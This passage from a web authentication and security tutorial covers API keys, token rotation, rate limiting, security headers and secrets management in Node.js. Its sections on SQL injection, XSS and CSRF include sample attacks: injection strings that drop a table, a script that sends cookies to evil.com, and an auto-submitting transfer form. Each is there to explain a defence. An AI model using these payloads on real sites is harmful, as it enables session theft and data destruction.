  const key = prefix + randomBytes;
  
  // Hash for storage
  const hash = crypto
    .createHash('sha256')
    .update(key)
    .digest('hex');
  
  // Store hash, return plain key
  await db.apiKeys.create({
    userId,
    name,
    keyHash: hash,
    prefix,
    createdAt: new Date(),
    lastUsed: null,
    permissions: ['read', 'write']
  });
  
  return key; // Only time user sees full key!
};

// Verify API key
const verifyApiKey = async (key) => {
  const hash = crypto
    .createHash('sha256')
    .update(key)
    .digest('hex');
  
  const apiKey = await db.apiKeys.findOne({ keyHash: hash });
  
  if (!apiKey) {
    return null;
  }
  
  // Update last used
  await db.apiKeys.update(
    { id: apiKey.id },
    { lastUsed: new Date() }
  );
  
  return apiKey;
};

// Middleware
const authenticateApiKey = async (req, res, next) => {
  const authHeader = req.headers.authorization;
  
  if (!authHeader || !authHeader.startsWith('Bearer ')) {
    return res.status(401).json({ error: 'No API key provided' });
  }
  
  const key = authHeader.substring(7);
  const apiKey = await verifyApiKey(key);
  
  if (!apiKey) {
    return res.status(401).json({ error: 'Invalid API key' });
  }
  
  req.apiKey = apiKey;
  req.user = { sub: apiKey.userId };
  next();
};

// Routes
app.post('/api/v1/posts', authenticateApiKey, async (req, res) => {
  // Check API key permissions
  if (!req.apiKey.permissions.includes('write')) {
    return res.status(403).json({ error: 'API key lacks write permission' });
  }
  
  const post = await db.posts.create(req.body);
  res.json(post);
});

// Create API key
app.post('/api-keys', authenticateJWT, async (req, res) => {
  const { name } = req.body;
  const key = await generateApiKey(req.user.sub, name);
  
  res.json({
    key,
    message: 'Save this key - you won\'t see it again!'
  });
});

// List API keys (without full keys)
app.get('/api-keys', authenticateJWT, async (req, res) => {
  const keys = await db.apiKeys.find({ userId: req.user.sub });
  
  res.json(keys.map(k => ({
    id: k.id,
    name: k.name,
    prefix: k.prefix,
    lastUsed: k.lastUsed,
    createdAt: k.createdAt
  })));
});

// Revoke API key
app.delete('/api-keys/:id', authenticateJWT, async (req, res) => {
  await db.apiKeys.delete({
    id: req.params.id,
    userId: req.user.sub
  });
  
  res.json({ message: 'API key revoked' });
});
```

**API Key Best Practices:**

```
✅ DO:
├─ Use HTTPS only
├─ Hash keys before storing
├─ Allow users to revoke keys
├─ Track last used date
├─ Rotate keys regularly
├─ Use scoped permissions
├─ Add rate limiting
└─ Log API key usage

❌ DON'T:
├─ Store keys in plain text
├─ Include keys in URLs
├─ Commit keys to Git
├─ Use same key everywhere
├─ Make keys too short
└─ Skip expiration dates
```

---

### 5. Token Rotation and Revocation

```
Problem with Long-Lived Tokens:
────────────────────────────────
❌ If stolen, attacker has access until expiration
❌ Can't revoke without database lookup
❌ User can't logout from all devices

Solution: Token Rotation
────────────────────────
1. Short-lived access token (15 min)
2. Long-lived refresh token (7 days)
3. Refresh token stored in database
4. Can revoke refresh tokens
5. Access tokens auto-expire quickly
```

**Token Rotation Flow:**

```mermaid
sequenceDiagram
    participant Client
    participant Server
    participant DB
    
    Note over Client,DB: Initial Login
    Client->>Server: POST /login (credentials)
    Server->>DB: Verify credentials
    Server->>DB: Create refresh token
    Server->>Client: Access token (15min) + Refresh token (7d)
    
    Note over Client,DB: After 15 minutes
    Client->>Server: GET /api/posts<br/>Authorization: Bearer expired_token
    Server->>Client: 401 Token expired
    Client->>Server: POST /refresh<br/>{ refreshToken: ... }
    Server->>DB: Verify refresh token
    Server->>DB: Optional: Rotate refresh token
    Server->>Client: New access token (15min) + New refresh token (7d)
    
    Note over Client,DB: Logout
    Client->>Server: POST /logout<br/>{ refreshToken: ... }
    Server->>DB: Delete refresh token
    Server->>Client: 200 OK
```

**Implementation:**

```javascript
// Token rotation
app.post('/refresh', async (req, res) => {
  const { refreshToken } = req.body;
  
  if (!refreshToken) {
    return res.status(401).json({ error: 'No refresh token' });
  }
  
  try {
    // Verify refresh token
    const decoded = jwt.verify(refreshToken, JWT_SECRET);
    
    // Check if token exists in database
    const storedToken = await db.refreshTokens.findOne({
      token: refreshToken,
      userId: decoded.sub
    });
    
    if (!storedToken) {
      return res.status(403).json({ error: 'Invalid refresh token' });
    }
    
    // Check if expired
    if (new Date() > storedToken.expiresAt) {
      await db.refreshTokens.delete({ id: storedToken.id });
      return res.status(403).json({ error: 'Refresh token expired' });
    }
    
    // Get user
    const user = await db.users.findById(decoded.sub);
    
    // Generate new access token
    const newAccessToken = jwt.sign(
      {
        sub: user.id,
        username: user.username,
        roles: user.roles
      },
      JWT_SECRET,
      { expiresIn: '15m' }
    );
    
    // Optional: Rotate refresh token (more secure)
    const newRefreshToken = jwt.sign(
      { sub: user.id },
      JWT_SECRET,
      { expiresIn: '7d' }
    );
    
    // Delete old refresh token
    await db.refreshTokens.delete({ id: storedToken.id });
    
    // Store new refresh token
    await db.refreshTokens.create({
      userId: user.id,
      token: newRefreshToken,
      expiresAt: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000)
    });
    
    res.json({
      accessToken: newAccessToken,
      refreshToken: newRefreshToken,
      expiresIn: 900 // 15 minutes
    });
  } catch (err) {
    return res.status(403).json({ error: 'Invalid refresh token' });
  }
});

// Logout from current device
app.post('/logout', async (req, res) => {
  const { refreshToken } = req.body;
  
  await db.refreshTokens.deleteOne({ token: refreshToken });
  
  res.json({ message: 'Logged out successfully' });
});

// Logout from all devices
app.post('/logout-all', authenticateJWT, async (req, res) => {
  await db.refreshTokens.deleteMany({ userId: req.user.sub });
  
  res.json({ message: 'Logged out from all devices' });
});

// List active sessions
app.get('/sessions', authenticateJWT, async (req, res) => {
  const sessions = await db.refreshTokens.find({ userId: req.user.sub });
  
  res.json(sessions.map(s => ({
    id: s.id,
    createdAt: s.createdAt,
    expiresAt: s.expiresAt,
    lastUsed: s.lastUsed
  })));
});

// Revoke specific session
app.delete('/sessions/:id', authenticateJWT, async (req, res) => {
  await db.refreshTokens.delete({
    id: req.params.id,
    userId: req.user.sub
  });
  
  res.json({ message: 'Session revoked' });
});
```

---

## Security Best Practices

### 1. HTTPS/TLS

```
HTTP vs HTTPS:
──────────────
HTTP:  Unencrypted
├─ ❌ Passwords sent in plain text
├─ ❌ Session IDs visible
├─ ❌ Data can be modified
└─ ❌ Man-in-the-middle attacks

HTTPS: Encrypted with TLS
├─ ✅ Data encrypted in transit
├─ ✅ Server authentication
├─ ✅ Data integrity
└─ ✅ Required for cookies (Secure flag)

Always use HTTPS in production!
```

**TLS Setup (nginx):**

```nginx
server {
  listen 80;
  server_name api.example.com;
  
  # Redirect HTTP to HTTPS
  return 301 https://$server_name$request_uri;
}

server {
  listen 443 ssl http2;
  server_name api.example.com;
  
  # SSL certificates (use Let's Encrypt)
  ssl_certificate /etc/letsencrypt/live/example.com/fullchain.pem;
  ssl_certificate_key /etc/letsencrypt/live/example.com/privkey.pem;
  
  # Modern TLS configuration
  ssl_protocols TLSv1.2 TLSv1.3;
  ssl_ciphers 'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256';
  ssl_prefer_server_ciphers off;
  
  # HSTS (force HTTPS for 1 year)
  add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
  
  location / {
    proxy_pass http://localhost:3000;
  }
}
```

---

### 2. Rate Limiting and DDoS Protection

```
Why Rate Limiting?
──────────────────
├─ Prevent brute force attacks
├─ Prevent DDoS
├─ Prevent API abuse
├─ Protect resources
└─ Fair usage

Common Algorithms:
──────────────────
1. Token Bucket
2. Leaky Bucket
3. Fixed Window
4. Sliding Window Log
```

**Token Bucket Algorithm:**

```
Imagine a bucket that holds tokens:
───────────────────────────────────
1. Bucket capacity: 100 tokens
2. Refill rate: 10 tokens/second
3. Each request costs 1 token
4. If bucket empty → Reject request

Example:
────────
Time  Tokens  Request  Result
0s    100     ✅       99 tokens left
0.1s  100     ✅       98 tokens left
...
10s   0       ❌       Rate limit exceeded
11s   10      ✅       9 tokens left
```

**Implementation (Express + Redis):**

```javascript
const redis = require('redis');
const client = redis.createClient();

const rateLimit = (options = {}) => {
  const {
    windowMs = 60 * 1000,     // 1 minute
    max = 100,                 // 100 requests per window
    keyGenerator = (req) => req.ip
  } = options;
  
  return async (req, res, next) => {
    const key = `rate_limit:${keyGenerator(req)}`;
    
    try {
      // Increment counter
      const requests = await client.incr(key);
      
      if (requests === 1) {
        // First request in window, set expiration
        await client.pExpire(key, windowMs);
      }
      
      // Get TTL
      const ttl = await client.pTTL(key);
      
      // Set headers
      res.setHeader('X-RateLimit-Limit', max);
      res.setHeader('X-RateLimit-Remaining', Math.max(0, max - requests));
      res.setHeader('X-RateLimit-Reset', new Date(Date.now() + ttl).toISOString());
      
      if (requests > max) {
        return res.status(429).json({
          error: 'Too many requests',
          retryAfter: Math.ceil(ttl / 1000)
        });
      }
      
      next();
    } catch (err) {
      // If Redis fails, allow request (fail open)
      console.error('Rate limit error:', err);
      next();
    }
  };
};

// Apply rate limiting
app.use('/api/', rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 100 // 100 requests per 15 minutes
}));

// Stricter rate limit for login (prevent brute force)
app.use('/login', rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 5, // 5 attempts per 15 minutes
  keyGenerator: (req) => req.body.username || req.ip
}));
```

**Advanced: Distributed Rate Limiting:**

```javascript
// Using Redis Lua script (atomic operation)
const rateLimitLua = `
local key = KEYS[1]
local limit = tonumber(ARGV[1])
local window = tonumber(ARGV[2])
local current = tonumber(redis.call('GET', key) or "0")

if current >= limit then
  return 0
else
  redis.call('INCR', key)
  if current == 0 then
    redis.call('EXPIRE', key, window)
  end
  return limit - current - 1
end
`;

const checkRateLimit = async (key, limit, windowSeconds) => {
  const remaining = await client.eval(
    rateLimitLua,
    1,
    key,
    limit,
    windowSeconds
  );
  
  return {
    allowed: remaining >= 0,
    remaining: Math.max(0, remaining)
  };
};
```

---

### 3. SQL Injection Prevention

```
SQL Injection Attack:
─────────────────────
Vulnerable code:
const query = `SELECT * FROM users WHERE username = '${username}'`;

Attack:
username = "admin' OR '1'='1"

Result:
SELECT * FROM users WHERE username = 'admin' OR '1'='1'
└─ Always true! Returns all users!

Worse:
username = "admin'; DROP TABLE users; --"

Result:
SELECT * FROM users WHERE username = 'admin'; DROP TABLE users; --'
└─ Deletes entire users table!
```

**Prevention:**

```javascript
// ❌ NEVER do this (vulnerable)
app.get('/users/:id', async (req, res) => {
  const query = `SELECT * FROM users WHERE id = ${req.params.id}`;
  const users = await db.query(query);
  res.json(users);
});

// ✅ Use parameterized queries
app.get('/users/:id', async (req, res) => {
  const query = 'SELECT * FROM users WHERE id = $1';
  const users = await db.query(query, [req.params.id]);
  res.json(users);
});

// ✅ Use ORM (Sequelize, TypeORM, Prisma)
app.get('/users/:id', async (req, res) => {
  const user = await User.findByPk(req.params.id);
  res.json(user);
});

// ✅ Validate input
app.get('/users/:id', async (req, res) => {
  const id = parseInt(req.params.id, 10);
  
  if (isNaN(id) || id < 1) {
    return res.status(400).json({ error: 'Invalid ID' });
  }
  
  const user = await User.findByPk(id);
  res.json(user);
});
```

---

### 4. XSS (Cross-Site Scripting) Prevention

```
XSS Attack:
───────────
Attacker injects malicious JavaScript into your site

Example:
────────
User posts comment:
<script>
  fetch('https://evil.com/steal?cookie=' + document.cookie)
</script>

When others view comment:
└─ Script executes in their browser
└─ Cookies sent to attacker
└─ Session hijacked!

Types of XSS:
─────────────
1. Stored XSS: Malicious code saved in database
2. Reflected XSS: Malicious code in URL/form
3. DOM-based XSS: Client-side JavaScript vulnerability
```

**Prevention:**

```javascript
// ❌ NEVER do this (vulnerable)
app.get('/search', (req, res) => {
  const query = req.query.q;
  res.send(`<h1>Results for: ${query}</h1>`);
});

// Attack: /search?q=<script>alert('XSS')</script>

// ✅ Escape HTML
const escapeHtml = (unsafe) => {
  return unsafe
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;");
};

app.get('/search', (req, res) => {
  const query = escapeHtml(req.query.q);
  res.send(`<h1>Results for: ${query}</h1>`);
});

// ✅ Use template engine with auto-escaping (EJS, Handlebars)
app.get('/search', (req, res) => {
  res.render('search', { query: req.query.q }); // Auto-escaped
});

// ✅ Content Security Policy (CSP) header
app.use((req, res, next) => {
  res.setHeader(
    'Content-Security-Policy',
    "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'"
  );
  next();
});

// ✅ Sanitize user input (for rich text)
const sanitizeHtml = require('sanitize-html');

app.post('/posts', async (req, res) => {
  const cleanContent = sanitizeHtml(req.body.content, {
    allowedTags: ['b', 'i', 'em', 'strong', 'a', 'p'],
    allowedAttributes: {
      'a': ['href']
    }
  });
  
  await db.posts.create({ content: cleanContent });
  res.json({ message: 'Post created' });
});
```

**React/Frontend:**

```javascript
// ✅ React auto-escapes by default
function SearchResults({ query }) {
  return <h1>Results for: {query}</h1>; // Safe!
}

// ❌ NEVER use dangerouslySetInnerHTML with user input
function UnsafeComponent({ userInput }) {
  return <div dangerouslySetInnerHTML={{ __html: userInput }} />; // Vulnerable!
}

// ✅ If you must render HTML, sanitize first
import DOMPurify from 'dompurify';

function SafeComponent({ userInput }) {
  const sanitized = DOMPurify.sanitize(userInput);
  return <div dangerouslySetInnerHTML={{ __html: sanitized }} />;
}
```

---

### 5. CSRF (Cross-Site Request Forgery) Prevention

```
CSRF Attack:
────────────
Attacker tricks user into making unwanted request

Example:
────────
1. User logged into bank.com
2. User visits evil.com
3. evil.com contains:
   <form action="https://bank.com/transfer" method="POST">
     <input name="to" value="attacker" />
     <input name="amount" value="1000" />
   </form>
   <script>document.forms[0].submit()</script>

4. Request sent to bank.com with user's cookies
5. Money transferred!
```

**Prevention:**

```javascript
// ✅ Use CSRF tokens
const csrf = require('csurf');
const cookieParser = require('cookie-parser');

app.use(cookieParser());
app.use(csrf({ cookie: true }));

// Send CSRF token to client
app.get('/form', (req, res) => {
  res.render('form', { csrfToken: req.csrfToken() });
});

// Verify CSRF token on POST
app.post('/transfer', (req, res) => {
  // CSRF middleware automatically verifies token
  // If invalid, returns 403 error
  
  const { to, amount } = req.body;
  // Process transfer...
  res.json({ message: 'Transfer successful' });
});

// ✅ SameSite cookie attribute
app.use(session({
  secret: 'your-secret',
  cookie: {
    sameSite: 'strict', // or 'lax'
    httpOnly: true,
    secure: true
  }
}));

// ✅ Verify Origin/Referer header
app.use((req, res, next) => {
  if (['POST', 'PUT', 'DELETE'].includes(req.method)) {
    const origin = req.headers.origin || req.headers.referer;
    
    if (!origin || !origin.startsWith('https://yourapp.com')) {
      return res.status(403).json({ error: 'Invalid origin' });
    }
  }
  
  next();
});

// ✅ For APIs: Use custom headers
// CSRF attacks can't set custom headers
app.use((req, res, next) => {
  if (req.headers['x-requested-with'] !== 'XMLHttpRequest') {
    return res.status(403).json({ error: 'CSRF protection' });
  }
  next();
});
```

**Frontend (React):**

```javascript
// Include CSRF token in requests
const csrfToken = document.querySelector('meta[name="csrf-token"]').content;

fetch('/transfer', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'X-CSRF-Token': csrfToken,
    'X-Requested-With': 'XMLHttpRequest'
  },
  body: JSON.stringify({ to: 'alice', amount: 100 })
});
```

---

### 6. Security Headers

```javascript
// Comprehensive security headers
const helmet = require('helmet');

app.use(helmet({
  // Content Security Policy
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", "'unsafe-inline'"],
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", "data:", "https:"],
      connectSrc: ["'self'"],
      fontSrc: ["'self'"],
      objectSrc: ["'none'"],
      mediaSrc: ["'self'"],
      frameSrc: ["'none'"],
    },
  },
  
  // HSTS (force HTTPS)
  hsts: {
    maxAge: 31536000, // 1 year
    includeSubDomains: true,
    preload: true
  },
  
  // Prevent clickjacking
  frameguard: {
    action: 'deny'
  },
  
  // Prevent MIME sniffing
  noSniff: true,
  
  // XSS filter
  xssFilter: true,
  
  // Hide X-Powered-By header
  hidePoweredBy: true
}));

// Additional headers
app.use((req, res, next) => {
  // Prevent caching of sensitive data
  res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate');
  res.setHeader('Pragma', 'no-cache');
  
  // Referrer policy
  res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
  
  // Permissions policy
  res.setHeader('Permissions-Policy', 'geolocation=(), microphone=(), camera=()');
  
  next();
});
```

---

### 7. Secrets Management

```
Never hardcode secrets!
───────────────────────
❌ const API_KEY = "sk_live_123abc";
❌ const DB_PASSWORD = "password123";

✅ Use environment variables
✅ Use secret management services
```

**Environment Variables:**

```javascript
// .env file (NEVER commit to Git!)
DATABASE_URL=postgresql://user:pass@localhost:5432/db
JWT_SECRET=your-super-secret-key
API_KEY=sk_live_123abc

// .gitignore
.env
.env.local

// Load in application
require('dotenv').config();

const dbUrl = process.env.DATABASE_URL;
const jwtSecret = process.env.JWT_SECRET;
```

**Secret Management Services:**

```javascript
// AWS Secrets Manager
const AWS = require('aws-sdk');
const secretsManager = new AWS.SecretsManager();

async function getSecret(secretName) {
  const data = await secretsManager.getSecretValue({ SecretId: secretName }).promise();
  return JSON.parse(data.SecretString);
}

const dbCredentials = await getSecret('production/db/credentials');

// HashiCorp Vault
const vault = require('node-vault')();

const { data } = await vault.read('secret/data/db-credentials');
const dbPassword = data.password;
```

**Password Hashing:**

```javascript
const bcrypt = require('bcrypt');

// Hash password (registration)
const saltRounds = 12; // Higher = more secure but slower
const passwordHash = await bcrypt.hash(password, saltRounds);

await db.users.create({
  username,
  passwordHash // Store hash, NEVER plain password
});

// Verify password (login)
const user = await db.users.findOne({ username });
const isValid = await bcrypt.compare(password, user.passwordHash);

if (isValid) {
  // Login successful
}
```

**Encryption at Rest:**

```javascript
const crypto = require('crypto');

const ENCRYPTION_KEY = process.env.ENCRYPTION_KEY; // 32 bytes
const IV_LENGTH = 16;

// Encrypt sensitive data
function encrypt(text) {
  const iv = crypto.randomBytes(IV_LENGTH);
  const cipher = crypto.createCipheriv('aes-256-cbc', Buffer.from(ENCRYPTION_KEY, 'hex'), iv);
  
  let encrypted = cipher.update(text, 'utf8', 'hex');
  encrypted += cipher.final('hex');
  
  return iv.toString('hex') + ':' + encrypted;
}

// Decrypt
function decrypt(text) {
  const parts = text.split(':');
  const iv = Buffer.from(parts[0], 'hex');
  const encrypted = parts[1];
  
  const decipher = crypto.createDecipheriv('aes-256-cbc', Buffer.from(ENCRYPTION_KEY, 'hex'), iv);
  
  let decrypted = decipher.update(encrypted, 'hex', 'utf8');
  decrypted += decipher.final('utf8');
  
  return decrypted;
}

// Store encrypted data
await db.users.update(
  { id: userId },
  { ssn: encrypt(ssn) }
);

// Read and decrypt
const user = await db.users.findById(userId);
const ssn = decrypt(user.ssn);
```

---

## Real-World Examples

### GitHub Authentication

```
GitHub uses:
────────────
1. Session-based auth for web
   └─ Cookies with CSRF tokens

2. OAuth 2.0 for third-party apps
   └─ "Sign in with GitHub"
   └─ Personal access tokens (PATs)

3. SSH keys for Git operations
   └─ Public key authentication

4. Two-factor authentication (2FA)
   └─ TOTP (authenticator apps)
   └─ Security keys (WebAuthn)

5. Fine-grained permissions
   └─ Repository access
   └─ Organization roles
   └─ Team permissions
```

**GitHub OAuth Flow:**

```
1. App redirects to GitHub:
   https://github.com/login/oauth/authorize?
     client_id=YOUR_CLIENT_ID&
     redirect_uri=https://yourapp.com/callback&
     scope=repo,user

2. User authorizes app

3. GitHub redirects back:
   https://yourapp.com/callback?code=TEMP_CODE

4. App exchanges code for token:
   POST https://github.com/login/oauth/access_token
   {
     "client_id": "YOUR_CLIENT_ID",
     "client_secret": "YOUR_CLIENT_SECRET",
     "code": "TEMP_CODE"
   }

5. GitHub returns access token:
   {
     "access_token": "gho_abc123",
     "token_type": "bearer",
     "scope": "repo,user"
   }

6. Use token to access API:
   GET https://api.github.com/user
   Authorization: Bearer gho_abc123
```

---

### AWS IAM (Identity and Access Management)

```
AWS Authorization Model:
────────────────────────
1. Users/Roles (Identity)
2. Policies (Permissions)
3. Resources (What to access)

Policy Structure:
─────────────────
{
  "Effect": "Allow" or "Deny",
  "Action": "s3:GetObject",
  "Resource": "arn:aws:s3:::my-bucket/*",
  "Condition": { ... }
}

Key Concepts:
─────────────
├─ Least Privilege: Give minimum permissions needed
├─ IAM Roles: For services, not long-lived credentials
├─ Temporary Credentials: STS (Security Token Service)
├─ MFA: For sensitive operations
└─ Policy Evaluation: Explicit Deny > Allow > Implicit Deny
```

**Example Policy (S3 Read-Only):**

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": [
        "s3:GetObject",
        "s3:ListBucket"
      ],
      "Resource": [
        "arn:aws:s3:::my-bucket",
        "arn:aws:s3:::my-bucket/*"
      ],
      "Condition": {
        "IpAddress": {
          "aws:SourceIp": "203.0.113.0/24"
        }
      }
    }
  ]
}
```

---

### Auth0 (Authentication-as-a-Service)

```
Auth0 provides:
───────────────
✅ User authentication (login/signup)
✅ Social login (Google, Facebook, GitHub)
✅ Enterprise SSO (SAML, ADFS)
✅ Multi-factor authentication
✅ Passwordless login
✅ User management
✅ Security features (brute force protection)

Why use Auth0?
──────────────
✅ Don't build auth from scratch
✅ Security best practices built-in
✅ Compliance (SOC 2, GDPR)
✅ Scalability
✅ Focus on your product

Similar services:
─────────────────
├─ Okta
├─ Firebase Auth
├─ AWS Cognito
├─ Supabase Auth
└─ Clerk
```

---

## Interview Questions

### Question 1: JWT vs Session-based Auth

```
Q: When would you use JWT vs sessions?

A: 
JWT:
✅ Microservices (stateless, no shared storage)
✅ Mobile apps (no cookie support)
✅ Third-party API access
✅ Cross-domain authentication

Sessions:
✅ Traditional web apps
✅ Need instant revocation
✅ Single domain
✅ Server-side rendering

Hybrid:
✅ Short-lived JWT (15 min)
✅ Long-lived refresh token in database
✅ Best of both worlds
```

---

### Question 2: Prevent Brute Force Attacks

```
Q: How do you prevent brute force login attempts?

A:
1. Rate limiting
   └─ 5 attempts per 15 minutes per username

2. Account lockout
   └─ Lock account after 10 failed attempts
   └─ Require email verification to unlock

3. CAPTCHA
   └─ After 3 failed attempts

4. Increase delay
   └─ Progressive delays (1s, 2s, 4s, 8s...)

5. Monitor and alert
   └─ Detect patterns
   └─ Alert security team

6. Multi-factor authentication
   └─ Even if password guessed, need second factor
```

**Implementation:**

```javascript
const loginAttempts = new Map(); // username -> { count, lastAttempt }

app.post('/login', async (req, res) => {
  const { username, password } = req.body;
  
  // Check rate limit
  const attempts = loginAttempts.get(username) || { count: 0, lastAttempt: 0 };
  
  if (attempts.count >= 5) {
    const timeSinceLastAttempt = Date.now() - attempts.lastAttempt;
    if (timeSinceLastAttempt < 15 * 60 * 1000) { // 15 minutes
      return res.status(429).json({
        error: 'Too many attempts. Try again later.',
        retryAfter: Math.ceil((15 * 60 * 1000 - timeSinceLastAttempt) / 1000)
      });
    } else {
      // Reset after 15 minutes
      loginAttempts.delete(username);
    }
  }
  
  // Verify credentials
  const user = await db.users.findOne({ username });
  if (!user || !await bcrypt.compare(password, user.passwordHash)) {
    // Increment failed attempts
    loginAttempts.set(username, {
      count: attempts.count + 1,
      lastAttempt: Date.now()
    });
    
    return res.status(401).json({ error: 'Invalid credentials' });
  }
  
  // Success - clear attempts
  loginAttempts.delete(username);
  
  // Generate token
  const token = jwt.sign({ sub: user.id }, JWT_SECRET);
  res.json({ accessToken: token });
});
```

---

### Question 3: Design Auth System for Microservices

```
Q: Design an authentication system for a microservices architecture.

A:

Architecture:
─────────────
┌─────────┐
│ Client  │
└────┬────┘
     │
     ▼
┌─────────────┐
│ API Gateway │ ← Verify JWT
└─────┬───────┘
      │
  ┌───┼────┬────────┐
  ▼   ▼    ▼        ▼
Users Posts Orders ...
Service Service Service

Components:
───────────
1. Auth Service
   ├─ Handle login/signup
   ├─ Issue JWT tokens
   └─ Manage refresh tokens

2. API Gateway
   ├─ Verify JWT on all requests
   ├─ Extract user info
   ├─ Forward to microservices
   └─ Rate limiting

3. Microservices
   ├─ Trust gateway (internal network)
   ├─ Receive user info in headers
   └─ Authorization checks

Token Flow:
───────────
1. User logs in → Auth Service
2. Auth Service returns JWT
3. Client sends JWT to API Gateway
4. Gateway verifies JWT
5. Gateway forwards request with user info
6. Microservice checks permissions
7. Returns data

Implementation:
───────────────
// API Gateway
app.use(async (req, res, next) => {
  const token = req.headers.authorization?.split(' ')[1];
  
  if (!token) {
    return res.status(401).json({ error: 'No token' });
  }
  
  try {
    const decoded = jwt.verify(token, JWT_SECRET);
    
    // Add user info to headers for downstream services
    req.headers['x-user-id'] = decoded.sub;
    req.headers['x-user-roles'] = decoded.roles.join(',');
    
    next();
  } catch (err) {
    return res.status(401).json({ error: 'Invalid token' });
  }
});

// Microservice
app.get('/posts', (req, res) => {
  const userId = req.headers['x-user-id'];
  const roles = req.headers['x-user-roles']?.split(',') || [];
  
  // Authorization check
  if (!roles.includes('editor')) {
    return res.status(403).json({ error: 'Forbidden' });
  }
  
  // Fetch posts...
});

Trade-offs:
───────────
✅ Stateless (scales well)
✅ No shared session storage
✅ Each service can authorize independently

❌ Can't revoke tokens (until expiration)
   └─ Mitigation: Short-lived tokens + refresh tokens
   
❌ Token size (sent with every request)
   └─ Mitigation: Keep payload small
```

---

### Question 4: OAuth 2.0 Security

```
Q: What are the security concerns with OAuth 2.0?

A:

1. Authorization Code Interception
   ────────────────────────────────
   Attack: Intercept code in redirect
   Prevention: PKCE (Proof Key for Code Exchange)

2. Token Leakage
   ─────────────
   Attack: Token stolen from client
   Prevention:
   ├─ Short-lived access tokens
   ├─ Secure storage
   ├─ HTTPS only
   └─ HttpOnly cookies for refresh tokens

3. CSRF on Redirect
   ─────────────────
   Attack: Trick user into authorizing malicious app
   Prevention: State parameter (random value)

4. Open Redirect
   ──────────────
   Attack: Redirect to malicious site
   Prevention: Validate redirect_uri against whitelist

5. Client Secret Exposure
   ────────────────────────
   Attack: Steal client secret
   Prevention:
   ├─ Never expose secret in frontend
   ├─ Use PKCE for SPAs/mobile
   └─ Rotate secrets regularly

PKCE Flow:
──────────
1. Client generates random code_verifier
2. Client hashes: code_challenge = SHA256(code_verifier)
3. Client sends code_challenge to auth server
4. Auth server returns code
5. Client sends code + code_verifier
6. Auth server verifies: SHA256(code_verifier) == code_challenge
7. If valid, returns token

Prevents: Code interception (attacker doesn't have verifier)
```

---

## Practice Exercises

### Exercise 1: Implement Complete Auth System

**Scenario:**
```
Build a complete authentication system with:
├─ User registration
├─ Login with JWT
├─ Refresh token rotation
├─ Password reset via email
├─ Email verification
├─ Multi-factor authentication (TOTP)
└─ Session management (list/revoke)

Requirements:
├─ Node.js + Express
├─ PostgreSQL database
├─ Redis for rate limiting
├─ Email service (SendGrid/Mailgun)
└─ Security best practices
```

<details>
<summary>Solution Outline</summary>

```javascript
// Database schema
CREATE TABLE users (
  id UUID PRIMARY KEY,
  email VARCHAR(255) UNIQUE NOT NULL,
  password_hash VARCHAR(255) NOT NULL,
  email_verified BOOLEAN DEFAULT FALSE,
  mfa_enabled BOOLEAN DEFAULT FALSE,
  mfa_secret VARCHAR(255),
  created_at TIMESTAMP DEFAULT NOW()
);

CREATE TABLE refresh_tokens (
  id UUID PRIMARY KEY,
  user_id UUID REFERENCES users(id),
  token VARCHAR(255) UNIQUE NOT NULL,
  expires_at TIMESTAMP NOT NULL,
  created_at TIMESTAMP DEFAULT NOW()
);

CREATE TABLE verification_tokens (
  id UUID PRIMARY KEY,
  user_id UUID REFERENCES users(id),
  token VARCHAR(255) UNIQUE NOT NULL,
  type VARCHAR(50) NOT NULL, -- 'email_verification', 'password_reset'
  expires_at TIMESTAMP NOT NULL,
  created_at TIMESTAMP DEFAULT NOW()
);

// Features to implement:
1. Registration
   └─ Validate email format
   └─ Hash password (bcrypt)
   └─ Send verification email
   └─ Create user (email_verified = false)

2. Email Verification
   └─ Generate unique token
   └─ Send email with link
   └─ Verify token
   └─ Mark email as verified

3. Login
   └─ Verify email + password
   └─ Check if email verified
   └─ If MFA enabled, require code
   └─ Generate access + refresh tokens
   └─ Return tokens

4. Refresh Token
   └─ Verify refresh token
   └─ Generate new access token
   └─ Optionally rotate refresh token

5. Password Reset
   └─ Request: Send reset email
   └─ Reset: Verify token + update password

6. MFA Setup
   └─ Generate secret
   └─ Return QR code
   └─ Verify code
   └─ Enable MFA

7. Sessions
   └─ List all sessions (refresh tokens)
   └─ Revoke specific session
   └─ Revoke all sessions
```

</details>

---

### Exercise 2: Design GitHub-like Permissions

**Scenario:**
```
Design a permission system similar to GitHub:

Organizations
├─ Owners (full access)
├─ Members
└─ Billing managers

Repositories
├─ Public vs Private
├─ Collaborators:
│  ├─ Admin
│  ├─ Write
│  └─ Read
└─ Teams (inherited from org)

Permissions:
├─ View repository
├─ Clone repository
├─ Create issues
├─ Create pull requests
├─ Merge pull requests
├─ Delete repository
└─ Manage collaborators

Questions:
1. Database schema?
2. How to check "Can user X perform action Y on repo Z"?
3. How to efficiently list all repos user has access to?
```

<details>
<summary>Solution</summary>

```sql
-- Database schema
CREATE TABLE organizations (
  id UUID PRIMARY KEY,
  name VARCHAR(255) NOT NULL
);

CREATE TABLE org_members (
  org_id UUID REFERENCES organizations(id),
  user_id UUID REFERENCES users(id),
  role VARCHAR(50) NOT NULL, -- 'owner', 'member', 'billing'
  PRIMARY KEY (org_id, user_id)
);

CREATE TABLE repositories (
  id UUID PRIMARY KEY,
  org_id UUID REFERENCES organizations(id),
  name VARCHAR(255) NOT NULL,
  visibility VARCHAR(50) NOT NULL DEFAULT 'private' -- 'public', 'private'
);

CREATE TABLE repo_collaborators (
  repo_id UUID REFERENCES repositories(id),
  user_id UUID REFERENCES users(id),
  permission VARCHAR(50) NOT NULL, -- 'admin', 'write', 'read'
